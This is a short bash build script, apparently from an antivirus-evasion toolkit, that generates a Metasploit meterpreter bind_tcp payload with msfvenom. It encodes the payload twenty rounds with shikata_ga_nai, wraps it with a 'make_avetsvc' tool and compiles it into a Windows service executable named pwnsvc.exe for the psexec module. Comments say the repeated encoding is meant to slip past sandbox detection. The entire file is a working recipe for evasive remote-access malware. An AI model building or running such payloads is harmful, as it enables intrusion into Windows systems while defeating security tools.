#!/bin/bash          
# simple example script for building the .exe file
# for use with msf psexec module
# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh
# make meterpreter bind payload, encoded 20 rounds with shikata_ga_nai
msfvenom -p windows/meterpreter/bind_tcp lport=8443 -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > sc.txt
# call make_avetsvc, the sandbox escape is due to the many rounds of decoding the shellcode
./make_avetsvc -f sc.txt
# compile to pwn.exe file
$win32_compiler -o pwnsvc.exe avetsvc.c
# cleanup
echo "" > defs.h
